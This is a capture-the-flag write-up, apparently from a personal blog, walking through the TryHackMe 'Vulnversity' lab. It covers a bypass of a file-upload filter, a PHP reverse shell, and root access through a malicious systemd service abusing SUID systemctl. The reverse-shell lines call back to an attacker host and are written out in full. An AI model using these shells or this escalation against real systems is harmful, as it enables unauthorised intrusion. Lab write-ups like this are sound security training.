---
date: 2025-08-04 00:00:00 +0000
layout: post
title: Vulnversity
subtitle: TryHackMe Writeup - Vulnversity
description: A step-by-step guide to completing the Vulnversity room on TryHackMe, covering recon, file upload bypass, and SUID privilege escalation.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/85dee7ce633f5668b104d329da2769c3.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/85dee7ce633f5668b104d329da2769c3.png
category: tryhackme
tags:
  - TryHackMe
  - File Upload
  - SUID
  - Privilege Escalation
  - Web Exploitation
author: mustafa_altayeb
paginate: true
---

# Vulnversity - TryHackMe Writeup

[Vulnversity](https://tryhackme.com/room/vulnversity) is an beginner-level room that teaches active reconnaissance, web application attacks, and privilege escalation through SUID binaries.

**Difficulty**: Easy ⭐  
**Operating System**: Linux (Ubuntu)  
**Themes**: Web Enumeration, File Upload Bypass, Privilege Escalation

---

## Objectives

1. Perform active reconnaissance to discover services and directories
2. Bypass file upload restrictions
3. Gain initial shell access
4. Escalate privileges to root via SUID misconfiguration

---

## Reconnaissance

### Nmap Scan

Started with a service version scan to identify open ports:

```bash
nmap -sV 10.10.220.119
```

**Results**:
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings**: 
- Port 3333 hosts a web server (main target)
- Multiple services running (FTP, SSH, Samba, Squid proxy)

### Directory Enumeration

Used Gobuster to discover hidden directories:

```bash
gobuster dir -u http://10.10.220.119:3333 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Discovered Directories**:
```
/images               (Status: 301)
/css                  (Status: 301)
/js                   (Status: 301)
/fonts                (Status: 301)
/internal             (Status: 301)  <-- Interesting!
```

---

## Web Application Analysis

### Internal Directory

Visiting `/internal` reveals a file upload page:

![Upload Page](/assets/TryHackMeRoomsImage/Vulnversity/image.png)

The application appears to have file extension filtering. Need to find which extensions are allowed.

### File Extension Fuzzing

Created a custom extension wordlist:
```
php
php3
php4
php5
phtml
...
```

Used Burp Suite Intruder to fuzz the upload functionality:

![Burp Suite Fuzzing](/assets/TryHackMeRoomsImage/Vulnversity/BurpSuit.png)

**Successful Extension**: `.phtml`

![Upload Success](/assets/TryHackMeRoomsImage/Vulnversity/BurpResult.png)

---

## Initial Access

### Creating Reverse Shell

Used Pentest Monkey's PHP reverse shell and renamed it to `shell.phtml`:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
// ...
system("/bin/bash -c 'bash -i >& /dev/tcp/10.11.139.85/1234 0>&1'");
?>
```

### Upload and Execution

1. **Start listener**:
```bash
nc -nlvp 1234
```

2. **Upload shell**: Successfully uploaded `shell.phtml` to `/internal/uploads/`

3. **Trigger shell**: Accessed `http://10.10.220.119:3333/internal/uploads/shell.phtml`

### Shell Access

```bash
$ whoami
www-data

$ cat /home/bill/user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

**User flag captured!**

---

## Privilege Escalation

### SUID Enumeration

Looked for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Interesting Finding**: `/bin/systemctl` has SUID bit set and is owned by root.

### Exploiting Systemctl SUID

Created a malicious systemd service file:

**root.service**:
```ini
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.11.139.85/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

### Execution Steps

1. **Transfer file to target**:
```bash
# On attacker machine
python3 -m http.server 3333

# On target machine
cd /tmp
wget http://10.11.139.85:3333/root.service
```

2. **Start listener**:
```bash
nc -nlvp 9999
```

3. **Exploit SUID**:
```bash
# On target machine
systemctl enable /tmp/root.service
systemctl start root
```

### Root Access

```bash
root@ip-10-10-220-119:~# whoami
root

root@ip-10-10-220-119:~# cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5
```

**Root flag captured!**

---

## Key Takeaways

### Attack Path Summary:
```
Port Scanning → Directory Enumeration → File Upload Bypass → 
Reverse Shell → SUID Enumeration → Systemctl Exploit → Root Access
```

### Vulnerabilities Exploited:
1. **Insufficient File Extension Validation** - Allowed `.phtml` upload
2. **SUID Misconfiguration** - `/bin/systemctl` with SUID enabled
3. **Weak Service Configuration** - Ability to create and enable custom services

### Defensive Measures:
- Implement proper file upload validation (whitelist approach)
- Regular SUID binary audits
- Restrict systemctl permissions
- Principle of least privilege for service accounts

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

**Find me online**:  
• TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)  
• LinkedIn: [Mustafa Altayeb](https://www.linkedin.com/in/t4t4r1s)  
• X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---
